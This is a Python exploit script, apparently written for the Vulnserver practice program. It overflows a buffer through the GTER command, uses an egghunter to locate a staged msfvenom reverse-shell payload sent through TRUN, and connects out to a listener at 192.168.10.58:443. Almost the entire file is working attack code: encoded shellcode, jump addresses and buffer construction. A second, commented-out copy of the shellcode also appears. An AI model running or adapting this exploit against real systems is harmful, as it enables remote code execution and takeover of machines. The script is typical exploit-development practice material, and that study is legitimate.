#!/usr/bin/python
# -*- coding: utf-8 -*-
# EIP OVERWRITE W/ EGGHUNTER #

import socket

#JMP ESP in essfunc.dll
offset = "\xaf\x11\x50\x62"

#JMP back into buffer to execute egghunter
jmpback = "\xeb\xb0\x90\x90"

# search for W00TW00T \x54\x30\x30\x57
egghunter = "\x90" * 10 + "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

# msfvenom -p windows/shell_reverse_tcp -f python -b "\x00\x0a\x0d" -v shell -e x86/shikata_ga_nai LHOST=192.168.10.58 LPORT=443
#Payload size: 351 bytes
#shell =  "T00WT00W"
#shell += "\x90\x90\x90\x90\x90\x90\x90\x90"
#shell += "\xda\xdd\xba\x49\xeb\xd3\x1f\xd9\x74\x24\xf4\x5e\x2b"
#shell += "\xc9\xb1\x52\x83\xc6\x04\x31\x56\x13\x03\x1f\xf8\x31"
#shell += "\xea\x63\x16\x37\x15\x9b\xe7\x58\x9f\x7e\xd6\x58\xfb"
#shell += "\x0b\x49\x69\x8f\x59\x66\x02\xdd\x49\xfd\x66\xca\x7e"
#shell += "\xb6\xcd\x2c\xb1\x47\x7d\x0c\xd0\xcb\x7c\x41\x32\xf5"
#shell += "\x4e\x94\x33\x32\xb2\x55\x61\xeb\xb8\xc8\x95\x98\xf5"
#shell += "\xd0\x1e\xd2\x18\x51\xc3\xa3\x1b\x70\x52\xbf\x45\x52"
#shell += "\x55\x6c\xfe\xdb\x4d\x71\x3b\x95\xe6\x41\xb7\x24\x2e"
#shell += "\x98\x38\x8a\x0f\x14\xcb\xd2\x48\x93\x34\xa1\xa0\xe7"
#shell += "\xc9\xb2\x77\x95\x15\x36\x63\x3d\xdd\xe0\x4f\xbf\x32"
#shell += "\x76\x04\xb3\xff\xfc\x42\xd0\xfe\xd1\xf9\xec\x8b\xd7"
#shell += "\x2d\x65\xcf\xf3\xe9\x2d\x8b\x9a\xa8\x8b\x7a\xa2\xaa"
#shell += "\x73\x22\x06\xa1\x9e\x37\x3b\xe8\xf6\xf4\x76\x12\x07"
#shell += "\x93\x01\x61\x35\x3c\xba\xed\x75\xb5\x64\xea\x7a\xec"
#shell += "\xd1\x64\x85\x0f\x22\xad\x42\x5b\x72\xc5\x63\xe4\x19"
#shell += "\x15\x8b\x31\x8d\x45\x23\xea\x6e\x35\x83\x5a\x07\x5f"
#shell += "\x0c\x84\x37\x60\xc6\xad\xd2\x9b\x81\x11\x8a\xa9\x6b"
#shell += "\xfa\xc9\xad\x8a\x41\x44\x4b\xe6\xa5\x01\xc4\x9f\x5c"
#shell += "\x08\x9e\x3e\xa0\x86\xdb\x01\x2a\x25\x1c\xcf\xdb\x40"
#shell += "\x0e\xb8\x2b\x1f\x6c\x6f\x33\xb5\x18\xf3\xa6\x52\xd8"
#shell += "\x7a\xdb\xcc\x8f\x2b\x2d\x05\x45\xc6\x14\xbf\x7b\x1b"
#shell += "\xc0\xf8\x3f\xc0\x31\x06\xbe\x85\x0e\x2c\xd0\x53\x8e"
#shell += "\x68\x84\x0b\xd9\x26\x72\xea\xb3\x88\x2c\xa4\x68\x43"
#shell += "\xb8\x31\x43\x54\xbe\x3d\x8e\x22\x5e\x8f\x67\x73\x61"
#shell += "\x20\xe0\x73\x1a\x5c\x90\x7c\xf1\xe4\xa0\x36\x5b\x4c"
#shell += "\x29\x9f\x0e\xcc\x34\x20\xe5\x13\x41\xa3\x0f\xec\xb6"
#shell += "\xbb\x7a\xe9\xf3\x7b\x97\x83\x6c\xee\x97\x30\x8c\x3b"
#shell += "\x90\x83\xc4\04"

#msfvenom -p windows/shell_reverse_tcp -f c -b "\x00\x0a\x0d" -v shell -e x86/shikata_ga_nai LHOST=192.168.10.58 LPORT=443
#Payload size: 351 bytes
shell = "T00WT00W"
shell+= "\xba\x2d\xb1\x2b\x1f\xd9\xe1\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
shell+= "\x52\x31\x55\x12\x03\x55\x12\x83\xc0\x4d\xc9\xea\xe6\x46\x8c"
shell+= "\x15\x16\x97\xf1\x9c\xf3\xa6\x31\xfa\x70\x98\x81\x88\xd4\x15"
shell+= "\x69\xdc\xcc\xae\x1f\xc9\xe3\x07\x95\x2f\xca\x98\x86\x0c\x4d"
shell+= "\x1b\xd5\x40\xad\x22\x16\x95\xac\x63\x4b\x54\xfc\x3c\x07\xcb"
shell+= "\x10\x48\x5d\xd0\x9b\x02\x73\x50\x78\xd2\x72\x71\x2f\x68\x2d"
shell+= "\x51\xce\xbd\x45\xd8\xc8\xa2\x60\x92\x63\x10\x1e\x25\xa5\x68"
shell+= "\xdf\x8a\x88\x44\x12\xd2\xcd\x63\xcd\xa1\x27\x90\x70\xb2\xfc"
shell+= "\xea\xae\x37\xe6\x4d\x24\xef\xc2\x6c\xe9\x76\x81\x63\x46\xfc"
shell+= "\xcd\x67\x59\xd1\x66\x93\xd2\xd4\xa8\x15\xa0\xf2\x6c\x7d\x72"
shell+= "\x9a\x35\xdb\xd5\xa3\x25\x84\x8a\x01\x2e\x29\xde\x3b\x6d\x26"
shell+= "\x13\x76\x8d\xb6\x3b\x01\xfe\x84\xe4\xb9\x68\xa5\x6d\x64\x6f"
shell+= "\xca\x47\xd0\xff\x35\x68\x21\xd6\xf1\x3c\x71\x40\xd3\x3c\x1a"
shell+= "\x90\xdc\xe8\x8d\xc0\x72\x43\x6e\xb0\x32\x33\x06\xda\xbc\x6c"
shell+= "\x36\xe5\x16\x05\xdd\x1c\xf1\xea\x8a\x14\x3b\x83\xc8\x28\x3a"
shell+= "\xe8\x44\xce\x56\x1e\x01\x59\xcf\x87\x08\x11\x6e\x47\x87\x5c"
shell+= "\xb0\xc3\x24\xa1\x7f\x24\x40\xb1\xe8\xc4\x1f\xeb\xbf\xdb\xb5"
shell+= "\x83\x5c\x49\x52\x53\x2a\x72\xcd\x04\x7b\x44\x04\xc0\x91\xff"
shell+= "\xbe\xf6\x6b\x99\xf9\xb2\xb7\x5a\x07\x3b\x35\xe6\x23\x2b\x83"
shell+= "\xe7\x6f\x1f\x5b\xbe\x39\xc9\x1d\x68\x88\xa3\xf7\xc7\x42\x23"
shell+= "\x81\x2b\x55\x35\x8e\x61\x23\xd9\x3f\xdc\x72\xe6\xf0\x88\x72"
shell+= "\x9f\xec\x28\x7c\x4a\xb5\x59\x37\xd6\x9c\xf1\x9e\x83\x9c\x9f"
shell+= "\x20\x7e\xe2\x99\xa2\x8a\x9b\x5d\xba\xff\x9e\x1a\x7c\xec\xd2"
shell+= "\x33\xe9\x12\x40\x33\x38"

firststage = "TRUN ." + "\x90" * 10 + shell + "\x90"* 500

crap = "\x90" * 70 + egghunter + "\x90" * (81 - len(egghunter)) + offset + jmpback + "\x43" * 2243 
#crap = "\x90" * 151 + offset + jmpback + "\x43" * 2245

#print "Egghunter Length " + str(len(egghunter))
buffer = "GTER "
buffer+=crap 

print "[*] Sending evil shenanigans - be patient"
print "[*] Sending " + str(len(buffer)) + " bytes to server"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('192.168.10.176', 9999))
s.send(firststage)
s.recv(1024)
s.send(buffer)
s.close()
